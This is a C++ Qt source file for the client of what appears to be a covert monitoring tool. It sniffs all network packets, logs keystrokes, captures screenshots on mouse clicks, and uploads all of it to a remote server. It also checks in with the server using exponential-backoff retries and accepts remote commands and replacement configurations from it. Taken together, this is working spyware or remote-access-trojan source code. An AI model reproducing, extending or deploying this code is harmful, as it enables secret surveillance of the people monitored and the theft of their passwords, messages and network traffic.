#include "client.h"

Client::Client(QObject* parent, const QString& _ip, const quint16& _destPort, const quint16& _locPort, const QString& defaultPath):
    QObject(parent),
    locPort(_locPort),
    destPort(_destPort),
    ip(_ip),
    path(defaultPath),
    onlineTimer{std::make_unique<QTimer>(this)},
    config{std::make_unique<Config>()},
    fileServer{std::make_unique<FileServer>(this, locPort, path)},
    fileClient{std::make_unique<FileClient>(this, ip, destPort)}
{    
    //Start sniffer
    QThread* snThread = new QThread();
    std::string filter = ""; //"ip dst net 192.168 and src net 192.168" - local network;
    sniffer = std::make_unique<Sniffer>(nullptr, path, filter);
    sniffer->moveToThread(snThread);
    connect(snThread, &QThread::started, sniffer.get(), &Sniffer::start);
    connect(snThread, &QThread::finished, snThread, &QThread::deleteLater);
    connect(snThread, &QThread::finished, sniffer.get(), &Sniffer::deleteLater);
    snThread->start();

    //Send sniffer data
    connect(sniffer.get(), &Sniffer::newData, [this](const QString& data){
        fileClient->enqueueDataAndConnect(std::make_unique<data::String>("DATA|" + data));
    });

    //Load config
    //Default path ./config.cfg
    if( ! loadConfig(*config, path + "/config.cfg") )
    {
        qDebug() << "Config not found. Creating new.";
        saveConfig(*config, path + "/config.cfg");
    }

    //Start module and update client state
    fileServer->start();
    update();

    //Trying connect to server
    getOnline();

    //Connect for receiving files and strings
    connect(fileServer.get(), &FileServer::fileReceived, [this](QString str, QString ip){ this->getFile(str, ip); });
    connect(fileServer.get(), &FileServer::stringReceived, [this](QString str, QString ip){ this->getString(str, ip); });

    //Make "screens" folder
    QDir dir;
    dir.mkdir(path + "/screens");

    //Set path
    MouseHook::instance().setPath(path);
    connect(&MouseHook::instance(), &MouseHook::screenSaved, [this](QString screenName)
    {
        //Send screenshot
        fileClient->enqueueDataAndConnect(std::make_unique<data::File>(path + "/screens/" + screenName));
    });

    //Send keyboard log by timer timeout
    Klog::instance().setPath(path);
    connect(&Klog::instance(), &Klog::timerIsUp, [this](){
        enqueueLog();
    });
}

Client::~Client()
{
    fileClient->sendAndDisconnect("OFFLINE|" + fileClient->getName());
}

void Client::update()
{
    qDebug() << "\nCONFIG:";
    qDebug() << "Screen timer:\t" << config->secondsScreen;

    //set flags
    qDebug() << "LMB:\t" << config->mouseButtons.test(int(Buttons::left));
    qDebug() << "RMB:\t" << config->mouseButtons.test(int(Buttons::right));
    qDebug() << "MMB:\t" << config->mouseButtons.test(int(Buttons::middle));
    qDebug() << "MWH:\t" << config->mouseButtons.test(int(Buttons::wheel));
    qDebug() << "Logging is " << (config->logRun ? "on" : "off");
    qDebug() << "Log timer:\t" << config->secondsLog << endl;

    //Update screenshot and log parameters
    MouseHook::instance().setParameters(config->mouseButtons, config->secondsScreen);
    Klog::instance().setParameters(config->logRun, config->secondsLog);
}

void Client::getOnline()
{
    //Queue string
    fileClient->enqueueDataAndConnect(std::make_unique<data::String>("ONLINE|" + fileClient->getName() + '|' + QString::number(locPort) ));

    connect(fileClient.get(), &FileClient::transmitted, onlineTimer.get(), &QTimer::stop);
    //Start and connect timer
    onlineTimer->start(2*1000);    //2, 4, 8, 16, ... seconds
    connect(onlineTimer.get(), &QTimer::timeout, [this](){
        fileClient->connect();
        int interval = onlineTimer->interval();
        if (interval < (10*60*1000)) //10 min
            onlineTimer->setInterval(2*interval);
    });
}

void Client::getFile(const QString& path, const QString& /* ip */)
{
    qDebug() << path;
    QString extension = path.section('.', -1, -1);
    //If config received
    if (extension == "cfg")
    {
        qDebug() << "Getting new config";
        getNewConfig(path);
    }
}

void Client::getString(const QString &string, const QString& /* ip */)
{
    QString command = string.section('|', 0, 0);
    if (command == "FILES")
    {
        QString filesStr = string;
        //remove "FILES|"
        int colonPos = string.indexOf("|");
        filesStr.remove(0, colonPos+1);

        QString currentFile = filesStr.section('|', 0, 0);
        int files = currentFile.toInt();

        if (files & static_cast<int>(Files::Screen)) emit MouseHook::instance().mouseClicked();
        if (files & static_cast<int>(Files::Log)) enqueueLog();
    }
}

void Client::getNewConfig(const QString &path)
{
    loadConfig(*config, path);
    update();

    //Delete old config and rename new
    QFile oldConfig(this->path + "/config.cfg");
    QFile newConfig(path);
    if (oldConfig.exists())
        oldConfig.remove();
    newConfig.rename(this->path + "/config.cfg");

    //Check if folder is empty and delete
    QDir dir = path.section('/', 0, -2);
    if(dir.entryInfoList(QDir::NoDotAndDotDot|QDir::AllEntries).count() == 0)
        dir.rmdir(path.section('/', 0, -2)); //dir.name()
}

/*
 * Copy current log to full log
 * Enqueue current log to data queue
 * Delete current log when data will be transmitted
*/
void Client::enqueueLog()
{
    QFile log(path + "/data.log");
    log.rename(path + "/data_tmp.log");
    QFile fullLog(path + "/fullData.log");

    if ( ! (log.open(QIODevice::ReadOnly) &&
         fullLog.open(QIODevice::Append)) )
    {
       qDebug() << "Can't open log files.";
       return;
    }

    //Copy temp log to full log
    fullLog.write(log.readAll());
    log.close();
    fullLog.close();

    //Delete temp log when it will be transmitted
    auto conn = std::make_shared<QMetaObject::Connection>();
    *conn = QObject::connect(fileClient.get(), &FileClient::transmitted, [this, conn]()
    {
        QFile::remove(path + "/data_tmp.log");
        QObject::disconnect(*conn); //disconnect
    });

    //Send log
    fileClient->enqueueDataAndConnect(std::make_unique<data::File>(path + "/data_tmp.log"));
}
